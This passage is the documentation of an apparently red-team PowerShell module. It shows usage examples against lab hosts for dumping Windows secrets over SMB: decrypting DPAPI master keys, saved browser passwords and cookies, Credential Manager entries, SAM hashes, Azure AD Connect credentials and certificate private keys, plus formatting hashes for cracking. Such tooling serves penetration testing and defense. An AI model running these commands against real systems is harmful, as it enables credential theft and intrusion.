Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeSystemHives
Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeMissing
```

#### Get-TBODpapiMasterKeyLocations

Enumerates DPAPI master key files for machine and user scopes over SMB and marks preferred keys when possible.
Writes progress to the console with the current path being scanned.
Machine scope includes keys under `S-1-5-18\user` when present.

```powershell
Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine
Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User
Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -ShareName C$
```

#### Get-TBODpapiMasterKeys

Decrypts DPAPI master keys.
Machine scope uses DPAPI_SYSTEM from LSA secrets, while user scope can be decrypted via user SID plus password or NT hash.
Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw DPAPI_SYSTEM key bytes.
`UserNtlmHash` accepts either a 32-hex NT hash or an `LM:NT` string (only the NT portion is used for DPAPI).
If a user-scoped master key cannot be decrypted with the current password/hash, `Get-TBODpapiMasterKeys` will attempt to use `CREDHIST` (when present) to handle password changes.

Decrypted master keys are cached in memory (per connection, per PowerShell session) and may be reused automatically by other cmdlets that need DPAPI master keys (for example, `Get-TBOCredManEntry`).

```powershell
Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBODpapiMasterKeys
Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -DpapiMachineKey <hex> -DpapiUserKey <hex>
Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine -ShareName C$
Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserNtlmHash '0123456789abcdef0123456789abcdef'

# Domain user example: decrypt user master keys with only an NT hash (no plaintext password).
$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserNtlmHash '0123456789abcdef0123456789abcdef'
Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
```

#### Get-TBODpapiMasterKeyHashes

Formats DPAPI master key files into John/Hashcat `$DPAPImk$...` hashes for offline password cracking.
Use `HashLine` (`{GUID}:$DPAPImk$...`) as the primary output for John/Hashcat.
When a `Preferred` file is present, `IsPreferred` indicates the current preferred key.
When a `BK-*` file is present in a user Protect directory, the hash context is set to 3 (domain); otherwise 1 (local).

```powershell
Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol

# Cache DPAPI master key hashes for later cracking/worklist/export.
Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache

# Dump only the John/Hashcat lines to a file
Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
  Select-Object -ExpandProperty HashLine |
  Set-Content -Encoding ascii .\dpapi-masterkey-hashes.txt

# Crack preferred keys first
Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
  Where-Object IsPreferred |
  Select-Object -ExpandProperty HashLine
```

#### Find-TBODpapiBlobs

Searches file system and registry paths for DPAPI blobs by looking for the DPAPI magic header in the first 1024 bytes.
Use `-Recurse` to walk child directories or registry keys.

```powershell
Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users' -Recurse
Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse -MaxBytes 2048
Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Microsoft -Recurse

# Cache DPAPI blob hits for later triage/worklist/export.
Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse -Cache
```

#### Get-TBODpapiMemoryDump

Scans a memory dump file (minidump/crash dump/raw) for embedded DPAPI blobs by streaming the file and searching for the DPAPI magic header.
Use `-Decrypt` with a master key set (or an already-populated per-session master key cache) to attempt decryption.

```powershell
# Scan a dump for DPAPI blobs (metadata only).
Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\lsass.dmp'

# Attempt decryption with a known master key set.
$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\lsass.dmp' -Decrypt -MasterKeys $userKeys

# Cache DPAPI blob hits (and any decrypted cleartext that looks like text) for later triage/export.
Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\lsass.dmp' -Cache
```

#### Get-TBODpapiBlob

Decrypts a DPAPI blob using a DPAPI master key.
Use Get-TBODpapiMasterKeys to recover the master key first.

```powershell
$mk = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBODpapiMasterKeys -Scope Machine |
  Where-Object IsPreferred
Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\Public\blob.bin' -MasterKey $mk.MasterKey

$blob = Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse |
  Select-Object -First 1
Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Path -Offset $blob.MatchOffset -MasterKey $mk.MasterKey

Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey
```

#### Get-TBOMachineCertificates

Enumerates machine RSA private keys (CAPI and CNG), decrypts the DPAPI-protected key material using machine master keys, and attempts to map recovered keys to LocalMachine\My certificates by matching the RSA modulus.
By default, only keys that match a certificate are returned. Use `-ShowAll` to return all recovered keys and decrypt failures.

```powershell
$keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBODpapiMasterKeys -Scope Machine
Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys

# Include unmatched keys and failures
Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -ShowAll

# Skip CNG keys (only scan CAPI MachineKeys)
Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -SkipCng
```

#### Get-TBOChromeLogins

Reads Chrome's Login Data SQLite database for user profiles over SMB and decrypts saved passwords.
Modern Chrome (v10/v11) uses an AES state key stored in `Local State` (`os_crypt.encrypted_key`), which is DPAPI-protected with user scope.
To avoid remote SQLite locking issues, TBO snapshots the database (and optional `-wal`/`-shm` sidecars when present) to a local temp directory before querying.
Use `-AllProfiles` to enumerate profile folders under `User Data` (Default, Profile *, Guest Profile, System Profile). When `-AllProfiles` is set, `-ProfileName` is ignored.
Use `-Browser` to target other Chromium browsers (`Edge`, `Brave`, `Chromium`). Default is `Chrome`.

```powershell
$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys

Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -MasterKeys $userKeys
Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -ProfileName 'Profile 2' -MasterKeys $userKeys

# Edge (Chromium)
Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Edge -AllProfiles -MasterKeys $userKeys
```

#### Get-TBOChromeCookies

Reads Chrome's Cookies SQLite database for user profiles over SMB and decrypts cookie values.
Prefers `Network\\Cookies` (newer Chrome path) and falls back to legacy `Cookies` when needed.
Use `-AllProfiles` to enumerate profile folders under `User Data` (Default, Profile *, Guest Profile, System Profile). When `-AllProfiles` is set, `-ProfileName` is ignored.
Use `-Browser` to target other Chromium browsers (`Edge`, `Brave`, `Chromium`). Default is `Chrome`.

```powershell
$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys

Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -MasterKeys $userKeys
Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys |
  Select-Object HostKey, Name, Value, ExpiresUtc

# Edge (Chromium)
Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Edge -AllProfiles -MasterKeys $userKeys
```

#### Get-TBOChromiumStateKeys

Reads a Chromium-based browser `Local State` file for user profiles over SMB and decrypts `os_crypt.encrypted_key` to obtain the AES state key used for AES-GCM v10/v11 secrets.
Use `-Browser` to target other Chromium browsers (`Edge`, `Brave`, `Chromium`). Default is `Chrome`.

```powershell
$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys

# Edge (Chromium) for a specific user
Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -Browser Edge -MasterKeys $userKeys

# Select common output fields
Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Brave -MasterKeys $userKeys |
  Select-Object UserName, Browser, StateKeyHex, MasterKeyGuid, HmacValidated, FailureReason
```

#### Get-TBOSafariKeychain

Parses Safari for Windows `keychain.plist` files and decrypts DPAPI-protected password entries.
Safari uses a fixed, application-specific DPAPI entropy value (same as dpapick's Safari probe), so the correct entropy is applied automatically.
The Safari cleartext payload is length-prefixed; TBO extracts the length and then decodes the password bytes as text when possible.

```powershell
$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys

# Specify a keychain.plist path directly (UNC or tbo: drive path)
Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\jsmith\AppData\Roaming\Apple Computer\Safari\keychain.plist' -MasterKeys $userKeys
```

#### Get-TBOCredManFiles

Enumerates Credential Manager files (Credentials and Vaults) for user and system profiles.

```powershell
Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith'
Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine
```

#### Get-TBOCredManEntry

Reads a Credential Manager file and reports metadata plus DPAPI blob offsets.
When DPAPI master keys are available (explicitly via `-MasterKeys` or from the in-memory cache populated by `Get-TBODpapiMasterKeys`), `Get-TBOCredManEntry` will attempt to decrypt the DPAPI payload and populate `Cleartext*` fields.
Scheduled task credentials (TaskScheduler:Task entries) are decoded into target, user, and secret lines when cleartext is available.

```powershell
$files = Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith'
$files | Get-TBOCredManEntry | Select-Object SourcePath, HasDpapiBlob, DpapiBlobOffset

Get-TBOCredManEntry -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\jsmith\AppData\Local\Microsoft\Credentials\CRED_FILE'

$keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBODpapiMasterKeys -Scope Machine
Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine |
  Get-TBOCredManEntry -MasterKeys $keys

# Decrypt using in-memory cached master keys (no explicit -MasterKeys needed on subsequent calls).
Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBODpapiMasterKeys -Scope Machine | Out-Null
Get-TBOCredManEntry -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\CRED_FILE'

$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith' |
  Get-TBOCredManEntry -MasterKeys $userKeys
```

#### Get-TBOAdConnectCredentials

Extracts and decrypts Entra ID (Azure AD) Connect Sync (ADSync) connector credentials from the ADSync database.
Requires DPAPI_SYSTEM from LSA secrets and a local SQL LocalDB instance to query the downloaded ADSync database files.
If `ADSync.mdf` is locked on the target, use `-Snapshot` with an `@GMT-...` token from `Get-TBOSmbSnapshots`.

```powershell
# Extract DPAPI_SYSTEM, then dump AAD Connect credentials.
Get-TBORegLsaSecrets -ServerName corp1-adconnect01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBOAdConnectCredentials

# Use a VSS snapshot token when the ADSync DB is locked.
$token = (Get-TBOSmbSnapshots -Path '\\corp1-adconnect01.corp1.lab.home-labs.lol\C$\Program Files\Microsoft Azure AD Sync\Data' |
  Select-Object -First 1).Token
Get-TBORegLsaSecrets -ServerName corp1-adconnect01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBOAdConnectCredentials -Snapshot $token
```

#### Get-TBORegAutoLogon

Reads autologon configuration values from the Winlogon registry key.

```powershell
Get-TBORegAutoLogon -ServerName corp1-web01.corp1.lab.home-labs.lol
```

#### Get-TBORegSamHashes

Derives local SAM account hashes using the remote registry (backup semantics required).

```powershell
Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
  Select-Object AccountName, FullName, Rid, NtlmHashText

# Cache SAM-derived NTHashes for later reuse queries.
Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache
Get-TBORegSamHashes -ServerName corp1-web02.corp1.lab.home-labs.lol -Cache
Get-TBOCacheCredentialReuse -Kind NTHash -MinimumMachineCount 2
```

#### Get-TBONtHash

Computes an NT hash (MD4 of UTF-16LE) for a password string.

```powershell
Get-TBONtHash -Password 'Passw0rd!'
'Passw0rd!' | Get-TBONtHash | Select-Object NtlmHashText
```

#### Find-TBORegWeakServices

Scans service security descriptors and reports AccessAllowed entries that grant service configuration rights to non-system trustees.
The default `AccessMask` flags include SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG, WRITE_DAC, WRITE_OWNER, and GENERIC_WRITE.
Output includes `AccessMaskText` (hex) and `AccessRights` (human-readable rights derived from the access mask).
SERVICE_ALL_ACCESS only matches when all service rights are granted; the other flags match if any of their bits are present.

```powershell
Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol
Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*'
Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -IgnoreServiceSids
Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AccessMask 0x00040002 -IncludeUninteresting
Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AccessMask 0x00000002
Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol |
  Select-Object ServiceName, AccessMaskText, AccessRights
```

#### Get-TBORegChildItem

Lists subkeys and values beneath a remote registry key.
By default, both subkeys and values are returned. If you specify `-IncludeSubkeys` or `-IncludeValues`, the output is limited to only those sets.
Use `-IncludeData` to include value payloads (only applies when values are included).

```powershell
Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE
Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\System\CurrentControlSet\Services\TestService -IncludeValues -IncludeData
Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -IncludeSubkeys
```

#### New-TBORegKey

Creates a remote registry key.

```powershell
New-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Cache
```

#### Remove-TBORegKey

Removes a remote registry key.

```powershell
Remove-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Cache
```

#### Get-TBORegValue

Gets values from a remote registry key.

```powershell
Get-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
Get-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName
```

#### Set-TBORegValue

Sets a remote registry value.

```powershell
Set-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Name InstallId -Type String -Value "abc123" -Cache
Set-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Name Flags -Type DwordLE -Value 1 -Cache
```

#### Remove-TBORegValue

Removes a remote registry value.

```powershell
Remove-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Name InstallId -Cache
```

## Local Logging

Set `TITANIS_TBO_LOG` to enable provider logging. Supported formats:

- `TITANIS_TBO_LOG=1` (or `true`/`yes`) writes to `%TEMP%\Titanis.TBO.Smb2.log` at `Info`.
- `TITANIS_TBO_LOG=<path>` writes to the specified file at `Info`.
- `TITANIS_TBO_LOG=<level>` writes to `%TEMP%\Titanis.TBO.Smb2.log` at the specified level.
- `TITANIS_TBO_LOG=<path>;<level>` writes to the specified file at the specified level.

Levels: `Info`, `Verbose`, `Diagnostic`, `Debug`, `Warning`, `Error`.

The log level is the minimum severity that will be written (lower/less severe levels are filtered out). From least to most verbose:

- `Error`: Only errors are logged.
- `Warning`: Warnings and errors.
- `Info`: High-level info plus warnings/errors (currently minimal beyond the "logging enabled" banner).
- `Verbose`: Adds higher-level flow and progress messages.
- `Diagnostic`: Adds low-level protocol/registry retry/cache details.
- `Debug`: Most verbose; includes diagnostic-level traces and extra debugging chatter.

## Build

```powershell
# Dev build (fast local test loop).
# Required when building from the TBO repo while referencing Titanis directly.
dotnet build .\src\Titanis.TBO.Smb2.PowerShell.csproj -c Release /p:UseArtifactsOutput=false

# Example: copy the built module folder for testing.
# robocopy .\src\bin\Release\net8.0\ C:\Temp\Titanis.TBO.Smb2 /E

# Bump the version (major|minor|patch) before commit.
.\Build\Update-Version.ps1 -Bump patch

# Release packaging with PSPublishModule (outputs to .\Artifacts\).
# Requires: Install-Module -Name PSPublishModule -Scope CurrentUser
.\Build\Build-Module.ps1 -Configuration Release

# Skip tests if you need a quick packaging run (not recommended).
# .\Build\Build-Module.ps1 -Configuration Release -SkipTests
```
